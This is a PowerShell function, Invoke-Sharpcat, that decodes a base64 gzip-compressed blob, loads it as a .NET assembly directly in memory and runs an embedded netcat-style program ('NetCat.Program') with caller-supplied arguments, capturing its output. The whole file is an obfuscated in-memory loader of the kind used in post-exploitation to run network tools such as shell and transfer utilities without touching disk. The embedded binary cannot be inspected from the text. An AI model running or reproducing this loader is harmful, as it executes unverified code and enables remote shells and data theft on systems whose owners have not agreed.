function Invoke-Sharpcat
{

    [CmdletBinding()]
    Param(
        [parameter(ValueFromRemainingArguments=$true)][String[]] $Command
    )
    $Command

    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

   

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [NetCat.Program]::Main($Command.Split(""))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
